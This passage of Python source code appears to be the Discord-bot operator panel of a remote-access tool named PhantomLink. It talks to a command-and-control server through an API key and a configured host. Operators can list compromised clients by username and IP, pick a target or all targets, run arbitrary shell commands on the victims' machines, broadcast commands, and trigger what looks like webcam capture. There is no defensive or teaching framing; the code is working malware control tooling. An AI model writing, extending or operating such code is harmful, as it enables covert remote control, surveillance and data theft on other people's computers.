                    msg += f"ID: `{c['id']}` - `{c['username']}` @ `{c['ip']}`\n"
                await interaction.followup.send(msg)
    except Exception as e:
        await interaction.followup.send(f"❌ Error getting clients: {e}")

@bot.tree.command(name="select", description="🎯 Select target client ID or 'all'")
@app_commands.describe(target_id="Client ID or 'all'")
async def slash_select(interaction: discord.Interaction, target_id: str = "all"):
    global TARGET_CLIENT
    TARGET_CLIENT = target_id.strip()
    await interaction.response.send_message(f"✅ Target set to **Client ID {TARGET_CLIENT}**")


# Register dynamic slash commands for simple and param commands
def _register_dynamic_slash_commands():
    for cmd_name, info in SIMPLE_COMMANDS.items():
        if bot.tree.get_command(cmd_name):
            continue
        desc = info['description'][:100]
        
        def make_simple_callback(c_name=cmd_name, c_cmds=info['commands']):
            async def callback(interaction: discord.Interaction):
                await interaction.response.defer()
                res = await send_commands_to_clients(c_cmds)
                if res and len(res) > 1900:
                    res = res[:1900] + "\n... (truncated)"
                out_msg = f"```\n{res}\n```" if res else "✅ Command sent!"
                await interaction.followup.send(out_msg)
            return callback

        cmd = app_commands.Command(
            name=cmd_name,
            description=desc,
            callback=make_simple_callback()
        )
        bot.tree.add_command(cmd)

    for cmd_name, info in PARAM_COMMANDS.items():
        if bot.tree.get_command(cmd_name):
            continue
        desc = info['description'][:100]

        def make_param_callback(c_name=cmd_name, c_build=info['build'], p_name=info['param_name']):
            async def callback(interaction: discord.Interaction, parameter: str = ""):
                await interaction.response.defer()
                if not parameter and c_name == 'camera':
                    parameter = "Integrated Camera"
                if not parameter:
                    await interaction.followup.send(f"❌ Missing parameter: `{p_name}`")
                    return
                cmds = c_build(parameter)
                cmds = [c for c in cmds if c is not None]
                if not cmds:
                    await interaction.followup.send(f"❌ Invalid parameter: `{parameter}`")
                    return
                res = await send_commands_to_clients(cmds)
                if res and len(res) > 1900:
                    res = res[:1900] + "\n... (truncated)"
                out_msg = f"```\n{res}\n```" if res else f"✅ **{c_name}** - Command sent!"
                await interaction.followup.send(out_msg)
            return callback

        param_descr = app_commands.describe(parameter=f"Parameter ({info['param_name']})")
        callback_fn = make_param_callback()
        callback_fn = param_descr(callback_fn)
        cmd = app_commands.Command(
            name=cmd_name,
            description=desc,
            callback=callback_fn
        )
        bot.tree.add_command(cmd)

_register_dynamic_slash_commands()


@bot.event
async def on_message(message):
    global TARGET_CLIENT
    if message.author == bot.user:
        return

    if message.channel.id != DISCORD_CHANNEL_ID:
        return

    content = message.content.strip()
    if not content:
        return

    content_lower = content.lower()
    prefix_char = content[0] if content[0] in ["/", "!"] else None

    if prefix_char:
        raw_token = content_lower[1:].split()[0]
        alias_map = {
            "client": "clients",
            "cilent": "clients",
            "cilents": "clients",
            "list": "clients",
            "targets": "clients",
            "command": "commands",
            "help": "commands",
        }
        if raw_token in alias_map:
            mapped = alias_map[raw_token]
            content_lower = prefix_char + mapped + content_lower[1 + len(raw_token):]

    # ── /clients or !clients ──
    if content_lower in ["/clients", "!clients"]:
        try:
            req = urllib.request.Request(f"http://{C2_HOST}:{API_PORT}/api/clients")
            req.add_header('X-API-Key', API_KEY)
            with urllib.request.urlopen(req, timeout=10) as response:
                data = json.loads(response.read())
                clients = data.get('clients', [])
                if not clients:
                    await message.channel.send("📭 No clients connected.")
                else:
                    msg = "📋 **Connected Clients:**\n"
                    for c in clients:
                        msg += f"ID: `{c['id']}` - `{c['username']}` @ `{c['ip']}`\n"
                    await message.channel.send(msg)
        except Exception as e:
            await message.channel.send(f"❌ Error getting clients: {e}")

    # ── /select or !select ──
    elif content_lower.startswith("/select") or content_lower.startswith("!select"):
        parts = content_lower.split()
        if len(parts) == 1:
            TARGET_CLIENT = "all"
            await message.channel.send("✅ Target set to **ALL clients**")
        else:
            TARGET_CLIENT = parts[1]
            await message.channel.send(f"✅ Target set to **Client ID {TARGET_CLIENT}**")

    # ── /ping or !ping ──
    elif content_lower in ["/ping", "!ping"]:
        await message.channel.send("🏓 **Pong!** Bot ตอบกลับได้สำเร็จ!")

    # ── /stop or !stop ──
    elif content_lower in ["/stop", "!stop"]:
        await message.channel.send("🔴 **Bot shutting down...**")
        await bot.close()

    # ── /commands or !commands ──
    elif content_lower in ["/commands", "!commands"]:
        cmd_text = get_commands_list_text()
        if len(cmd_text) > 2000:
            parts = [cmd_text[i:i+1900] for i in range(0, len(cmd_text), 1900)]
            for part in parts:
                await message.channel.send(part)
        else:
            await message.channel.send(cmd_text)

    # ── Simple commands (no parameters) ──
    elif prefix_char and content_lower[1:] in SIMPLE_COMMANDS:
        cmd_key = content_lower[1:]
        cmd_info = SIMPLE_COMMANDS[cmd_key]
        await message.channel.send(f"⏳ Executing `/{cmd_key}`...")

        result = await send_commands_to_clients(cmd_info['commands'])
        if result:
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            await message.channel.send(f"✅ **{cmd_key}** result:\n```\n{result}\n```")
        else:
            await message.channel.send(f"✅ **{cmd_key}** - Command sent!")

    # ── Parameter commands ──
    elif prefix_char and content_lower[1:].split()[0] in PARAM_COMMANDS:
        parts = content.split(maxsplit=1)
        cmd_key = parts[0][1:].lower()
        cmd_info = PARAM_COMMANDS[cmd_key]

        if len(parts) < 2:
            if cmd_key == 'camera':
                param = "Integrated Camera"
            else:
                await message.channel.send(f"❌ Missing parameter: `{cmd_info['param_name']}`\n{cmd_info['description']}")
                return
        else:
            param = parts[1]
        commands = cmd_info['build'](param)
        commands = [c for c in commands if c is not None]

        if not commands:
            await message.channel.send(f"❌ Invalid parameter: `{param}`")
            return

        await message.channel.send(f"⏳ Executing `/{cmd_key} {param}`...")

        result = await send_commands_to_clients(commands)
        if result:
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            await message.channel.send(f"✅ **{cmd_key}** result:\n```\n{result}\n```")
        else:
            await message.channel.send(f"✅ **{cmd_key}** - Command sent!")

    # ── /cmd or !cmd <raw command> ──
    elif content_lower.startswith("/cmd ") or content_lower.startswith("!cmd "):
        raw_cmd = content[5:].strip()
        if not raw_cmd:
            await message.channel.send("❌ Usage: `/cmd <command>`")
            return

        await message.channel.send(f"⏳ Running: `{raw_cmd[:100]}`...")

        result = await send_commands_to_clients([raw_cmd])
        if result:
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            await message.channel.send(f"```\n{result}\n```")
        else:
            await message.channel.send("✅ Command sent (no output)")

    # ── /broadcast or !broadcast <raw command> ──
    elif content_lower.startswith("/broadcast ") or content_lower.startswith("!broadcast "):
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await message.channel.send("❌ Usage: `/broadcast <command>`")
            return

        raw_cmd = parts[1].strip()
        await message.channel.send(f"📢 **Broadcasting to ALL clients:** `{raw_cmd[:100]}`...")

        orig_target = TARGET_CLIENT
        try:
            TARGET_CLIENT = "all"
            result = await send_commands_to_clients([raw_cmd])
        finally:
            TARGET_CLIENT = orig_target

        if result:
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            await message.channel.send(f"```\n{result}\n```")
        else:
            await message.channel.send("✅ Broadcast command sent (no output)")

    # ── Unknown command ──
    elif prefix_char:
        cmd_name = content.split()[0]
        await message.channel.send(
            f"❓ Unknown command: `{cmd_name}`\n"
            f"Use `/commands` to see all available commands"
        )


    # ── Unknown command ──
    elif content.startswith("!"):
        cmd_name = content.split()[0]
        await message.channel.send(
            f"❓ Unknown command: `{cmd_name}`\n"
            f"Use `!commands` to see all available commands"
        )


async def send_commands_to_clients(commands):
    """Send commands to connected C2 clients and return combined output"""
    try:
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(None, _send_commands_sync, commands)
        return result
    except Exception as e:
        print(f"[!] Error sending commands: {e}")
        return f"[Error: {e}]"



def _check_c2_server():
    """Check if C2 API server is running before sending commands"""
    for host in [C2_HOST, "127.0.0.1", "localhost"]:
        try:
            url = f"http://{host}:{API_PORT}/api/status"
            req = urllib.request.Request(url)
            req.add_header('X-API-Key', API_KEY)
            with urllib.request.urlopen(req, timeout=3) as response:
                data = json.loads(response.read())
                if data.get('status') == 'ok':
                    return True
        except Exception:
            pass

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        res = s.connect_ex(("127.0.0.1", API_PORT))
        s.close()
        if res == 0:
            return True
    except Exception:
        pass

    return False


def _send_commands_sync(commands):
    """Synchronous version - connects to C2 API and sends commands"""
    # Check if C2 server is running first
    if not _check_c2_server():
        return (
            "[!] ❌ C2 Server ไม่ได้เปิดอยู่!\n"
            "[!] กรุณาเปิด C2 Server ก่อนใช้คำสั่ง\n"
            f"[!] ต้องรัน C2.py บน {C2_HOST}:{C2_PORT} ก่อน"
        )

    try:
        url = f"http://{C2_HOST}:{API_PORT}/api/command"
        headers = {'Content-Type': 'application/json', 'X-API-Key': API_KEY}
        results_str = ""
        
        for cmd in commands:
            data = json.dumps({'command': cmd, 'target': TARGET_CLIENT}).encode('utf-8')
            req = urllib.request.Request(url, data=data, headers=headers)
            try:
                with urllib.request.urlopen(req, timeout=30) as response:
                    res_data = json.loads(response.read())
                    res_list = res_data.get('results', [])
                    if not res_list:
                        if TARGET_CLIENT == 'all':
                            results_str += "[!] ❌ ไม่มี client เชื่อมต่ออยู่เลย (No clients connected)\n"
                        else:
                            results_str += f"[!] ❌ ไม่พบเป้าหมาย ID: {TARGET_CLIENT} (Client may have disconnected)\n"
                    for r in res_list:
                        cid = r.get('client_id')
                        status = r.get('status')
                        output = r.get('output')
                        user = r.get('username')
                        user_info = f" ({user})" if user else ""
                        if status == 'not_found':
                            results_str += f"[Client {cid}] ❌ Status: Not Found (Disconnected)\n"
                        else:
                            if output:
                                results_str += f"[Client {cid}{user_info}] Status: {status}\n{output}\n"
                            else:
                                results_str += f"[Client {cid}{user_info}] Status: {status}\n"
            except urllib.error.URLError as e:
                results_str += f"[!] C2 Server connection error: {e.reason}\n"
            except Exception as e:
                results_str += f"[!] API error: {e}\n"
                
        return results_str

    except Exception as e:
        return f"[!] Error communicating with C2 API: {e}"




async def main():
    token = config.DISCORD_BOT_TOKEN
    if not token.strip():
        return
    try:
        await client.start(token)
    except discord.LoginFailure:
        print("[!] Invalid or Expired Discord Bot Token!")
        print("[*] Please check PHANTOMLINK_BOT_TOKEN in your .env file.")
        print("[*] Note: C2 Server and Discord Webhook notifications will still run normally.")
    except Exception as e:
        print(f"[!] Discord Bot Error: {e}")


if __name__ == "__main__":
    print("[*] Starting PhantomLink Discord Bot...")
    asyncio.run(main())
